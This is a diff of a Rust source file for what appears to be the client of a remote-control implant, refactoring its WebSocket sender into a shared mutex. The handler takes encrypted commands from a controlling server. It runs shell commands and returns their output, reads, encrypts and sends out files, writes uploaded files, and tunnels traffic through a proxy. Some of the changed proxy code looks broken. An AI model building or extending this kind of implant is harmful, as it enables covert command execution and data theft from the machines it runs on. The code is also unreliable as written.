@@ -1,24 +1,27 @@
-use futures_util::stream::{SplitSink, SplitStream};
+use std::sync::Arc;
+
+use futures_util::stream::{SplitSink, SplitStream, StreamExt};
 use tokio::fs;
 use tokio::net::TcpStream;
 use tokio::process::Command;
+use tokio::sync::Mutex;
 use tokio_tungstenite::tungstenite::Message;
-use tokio_tungstenite::{MaybeTlsStream, WebSocketStream};
+use tokio_tungstenite::WebSocketStream;
 use crate::communication;
 use crate::compression;
 use crate::crypto;
 
 pub struct RxCommandHandler {
     passphrase: String,
-    ws_sender: Option<SplitSink<WebSocketStream<MaybeTlsStream<TcpStream>>, Message>>,
-    ws_receiver: Option<SplitStream<WebSocketStream<MaybeTlsStream<TcpStream>>>>,
+    ws_sender: Option<Arc<Mutex<SplitSink<WebSocketStream<TcpStream>, Message>>>>,
+    ws_receiver: Option<Arc<Mutex<SplitStream<WebSocketStream<TcpStream>>>>>,
 }
 
 impl RxCommandHandler {
     pub fn new(
         passphrase: String,
-        ws_sender: Option<SplitSink<WebSocketStream<MaybeTlsStream<TcpStream>>, Message>>,
-        ws_receiver: Option<SplitStream<WebSocketStream<MaybeTlsStream<TcpStream>>>>,
+        ws_sender: Option<Arc<Mutex<SplitSink<WebSocketStream<TcpStream>, Message>>>>,
+        ws_receiver: Option<Arc<Mutex<SplitStream<WebSocketStream<TcpStream>>>>>,
     ) -> Self {
         RxCommandHandler { passphrase, ws_sender, ws_receiver }
     }
@@ -58,7 +61,8 @@ impl RxCommandHandler {
         }
 
         if let Some(ws_sender) = &self.ws_sender {
-            communication::send_binary_data(ws_sender, file_list).await;
+            let mut sender = ws_sender.lock().await;
+            communication::send_binary_data(&mut sender, file_list.into_bytes()).await;
         }
     }
 
@@ -69,7 +73,8 @@ impl RxCommandHandler {
                 let encrypted_data = crypto::encrypt(&compressed_data, self.passphrase.as_bytes());
 
                 if let Some(ws_sender) = &self.ws_sender {
-                    communication::send_binary_data(ws_sender, encrypted_data).await;
+                    let mut sender = ws_sender.lock().await;
+                    communication::send_binary_data(&mut sender, encrypted_data).await;
                 }
             }
             Err(e) => eprintln!("Failed to read file {}: {}", file_path, e),
@@ -87,14 +92,14 @@ impl RxCommandHandler {
         };
 
         let file_data = match parts.next() {
-            Some(data) => data.as_bytes().to_vec(), // Directly use the binary data
+            Some(data) => data.as_bytes().to_vec(),
             None => {
                 eprintln!("No file data specified for upload.");
                 return;
             }
         };
 
-        let binary_data = communication::decrypt_binary_data(file_data, &self.passphrase.as_str());
+        let binary_data = communication::decrypt_binary_data(file_data, &self.passphrase);
 
         match fs::write(file_path, binary_data).await {
             Ok(_) => eprintln!("File {} uploaded successfully.", file_path),
@@ -113,7 +118,8 @@ impl RxCommandHandler {
         let result = String::from_utf8_lossy(&output.stdout);
 
         if let Some(ws_sender) = &self.ws_sender {
-            communication::send_message(ws_sender, &self.passphrase.as_str(), &result).await;
+            let mut sender = ws_sender.lock().await;
+            communication::send_message(&mut sender, &self.passphrase, &result).await;
         }
     }
 
@@ -128,16 +134,9 @@ impl RxCommandHandler {
             .expect("Failed to connect to proxy server");
 
         let (proxy_sender, mut proxy_receiver) = ws_stream.split();
-        if let Some(ws_sender) = &self.ws_sender {
-            let (client_sender, mut client_receiver) = ws_sender.split();
 
-            tokio::spawn(async move {
-                while let Some(message) = client_receiver.next().await {
-                    if let Ok(msg) = message {
-                        proxy_sender.send(msg).await.expect("Failed to send message to proxy");
-                    }
-                }
-            });
+        if let Some(ws_sender) = &self.ws_sender {
+            let mut client_sender = ws_sender.lock().await;
 
             tokio::spawn(async move {
                 while let Some(message) = proxy_receiver.next().await {
@@ -146,24 +145,26 @@ impl RxCommandHandler {
                     }
                 }
             });
+
+            tokio::spawn(async move {
+                while let Some(message) = client_sender.next().await {
+                    if let Ok(msg) = message {
+                        proxy_sender.send(msg).await.expect("Failed to send message to proxy");
+                    }
+                }
+            });
         }
     }
 
     async fn exit_proxy_mode(&self) {
-        // Exit proxy mode and return to previous connection
-        // For this example, we assume that exiting proxy mode just stops the proxy connection
+        // Exit proxy mode and return to the previous connection
         // This would be more complex depending on your actual connection management
     }
-
 
     pub async fn handle_responses(&mut self) {
         if let Some(ws_receiver) = &mut self.ws_receiver {
             while let Some(message) = ws_receiver.next().await {
-                
                 match message {
-                    Ok(Message::Text(response)) => {
-                        self.handle_text_response(&response).await;
-                    }
                     Ok(Message::Binary(data)) => {
                         self.handle_binary_response(data).await;
                     }
@@ -174,7 +175,7 @@ impl RxCommandHandler {
     }
 
     async fn handle_binary_response(&self, data: Vec<u8>) {
-        let command: Vec<u8> = communication::decrypt_binary_data(data, &self.passphrase).await;
+        let command: Vec<u8> = communication::prepare_rx(data, &self.passphrase);
         let command_str = String::from_utf8_lossy(&command);
         self.handle_command(&command_str).await;
     }
